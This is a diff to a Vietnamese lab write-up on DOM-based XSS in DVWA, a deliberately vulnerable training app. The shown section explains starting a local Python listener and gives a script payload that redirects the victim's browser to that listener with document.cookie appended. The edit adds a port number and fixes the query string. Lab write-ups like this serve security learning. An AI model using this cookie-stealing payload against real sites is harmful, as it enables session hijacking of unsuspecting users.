@@ -10,13 +10,13 @@
 ![image](https://github.com/user-attachments/assets/752634e3-7aba-43c7-945d-07c6b05c5136)
 
 Pwn time:
-1. Tạo 1 local server qua python
+1. Tạo 1 local server qua python (port 8000)
 ![image](https://github.com/user-attachments/assets/6a79af35-58fe-4de8-b9d7-77fb0ad444a4)
 
 2. Tạo payload độc, lừa user nhập vào
 Payload gốc:
 ```
-127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English<script>window.location='http://127.0.0.1:8000/?cookie' + document.cookie</script>
+127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English<script>window.location='http://127.0.0.1:8000/?cookie=' + document.cookie</script>
 ```
 ![image](https://github.com/user-attachments/assets/ee01b5a4-71a4-48cf-b0db-9b04016eaefc)
 *Nó sẽ ra 1 trang ntn*
